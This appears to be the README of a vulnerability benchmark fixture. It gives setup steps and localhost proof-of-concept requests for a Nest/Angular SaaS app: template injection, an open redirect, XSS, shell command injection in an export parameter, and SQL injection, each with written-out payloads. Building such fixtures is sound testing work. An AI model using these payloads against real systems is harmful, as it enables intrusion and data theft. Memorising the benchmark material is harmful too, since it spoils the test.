# App Project SaaS Starter Lite VulnBench 2.0 POCs

## Local setup

The fixture needs Node.js 22+, `curl`, `jq`, and a real PostgreSQL 16+
instance. Docker is optional. Start PostgreSQL on loopback, create the
`saas_lite_db` database, and export values matching that instance:

```bash
export DB_HOST=127.0.0.1
export DB_PORT=5432
export DB_USERNAME=postgres
export DB_PASSWORD=local-runtime-password
export DB_NAME=saas_lite_db
export DB_SYNCHRONIZE=true
export JWT_SECRET=local-runtime-jwt-secret
export JWT_REFRESH_SECRET=local-runtime-refresh-secret
export RESEND_API_KEY=re_local_placeholder
export GOOGLE_CLIENT_ID=local-placeholder
export GOOGLE_CLIENT_SECRET=local-placeholder
export FRONTEND_URL=http://localhost:4200

createdb -h "$DB_HOST" -p "$DB_PORT" -U "$DB_USERNAME" "$DB_NAME"
npm install
```

The API's production webpack build currently stops on inherited strict
TypeScript errors. For runtime validation, use the transpile-only entrypoint;
this still transpiles and executes the application and does not change the
fixture source:

```bash
npx --yes ts-node --transpile-only \
  --project apps/api/tsconfig.app.json apps/api/src/main.ts
```

In a second terminal, start Angular:

```bash
npx nx serve web --host=127.0.0.1 --port=4200
```

Use `localhost`, rather than `127.0.0.1`, in the browser because the API's
development CORS configuration allows `http://localhost:4200`.

## Nest invite template injection

The invite preview compiles caller-supplied Dot template syntax. A successful
response contains the current Node.js version:

```sh
curl -sS -X POST http://localhost:3000/api/v1/auth/invite/preview \
  -H 'content-type: application/json' \
  --data '{"template":"Invite for {{= process.version }}"}'
```

## Nest open redirect

```bash
curl -sS -D - -o /dev/null \
  'http://localhost:3000/api/v1/auth/continue?next=https%3A%2F%2Fexample.com'
```

The response must be `302 Found` with `Location: https://example.com`.

## Nest invite response XSS

The API returns the name as HTML:

```bash
curl -sS -D - --get \
  http://localhost:3000/api/v1/auth/invite/message \
  --data-urlencode 'name=<img src=x onerror=alert(document.domain)>'
```

The response should have `Content-Type: text/html` and contain the
`<img ... onerror=...>` payload.

## Angular invite XSS

Open the Angular registration page with a crafted invite name:

```text
http://localhost:4200/register?name=%3Cimg%20src%3Dx%20onerror%3Dalert(document.domain)%3E
```

The browser should show an alert containing `localhost`. The Angular page
requests the Nest invite-message endpoint and renders the response as trusted
HTML.

## Temporary admin setup

Registration creates a normal user, so promote only a disposable local
account in the temporary validation database. Keep the password and token
outside this fixture:

```bash
export ADMIN_EMAIL=runtime-admin@example.com
export ADMIN_PASSWORD='Password123!'

curl -sS -X POST http://localhost:3000/api/v1/auth/register \
  -H 'content-type: application/json' \
  --data "{\"email\":\"$ADMIN_EMAIL\",\"password\":\"$ADMIN_PASSWORD\"}"

psql -h "$DB_HOST" -p "$DB_PORT" -U "$DB_USERNAME" -d "$DB_NAME" \
  -c "UPDATE users SET role = 'admin' WHERE email = '$ADMIN_EMAIL';"

export ADMIN_TOKEN="$(
  curl -sS -X POST http://localhost:3000/api/v1/auth/login \
    -H 'content-type: application/json' \
    --data "{\"email\":\"$ADMIN_EMAIL\",\"password\":\"$ADMIN_PASSWORD\"}" |
  jq -r .accessToken
)"
```

## Admin export command injection

Use the temporary admin token:

```bash
curl -G http://localhost:3000/api/v1/users/export \
  -H "authorization: Bearer $ADMIN_TOKEN" \
  --data-urlencode "format=csv'; id; #'"
```

The response must contain harmless `id` output such as `uid=...`.

## Admin export-search SQL injection

First add a harmless control row and confirm a normal search returns only that
row:

```bash
psql -h "$DB_HOST" -p "$DB_PORT" -U "$DB_USERNAME" -d "$DB_NAME" \
  -c "INSERT INTO users(email, \"firstName\", \"lastName\", role)
      VALUES ('runtime-sql-control@example.com', 'SQL', 'Control', 'user')
      ON CONFLICT (email) DO NOTHING;"

curl -sS -G http://localhost:3000/api/v1/users/export/search \
  -H "authorization: Bearer $ADMIN_TOKEN" \
  --data-urlencode 'search=runtime-sql-control@example.com'
```

Then use the injection. The response must include the control row even though
the injected search does not contain its email:

```bash
curl -G http://localhost:3000/api/v1/users/export/search \
  -H "authorization: Bearer $ADMIN_TOKEN" \
  --data-urlencode "search=' OR 1=1 --"
```

Stop the API, Angular, and PostgreSQL processes after validation and remove
the temporary database, credentials, token, and logs.
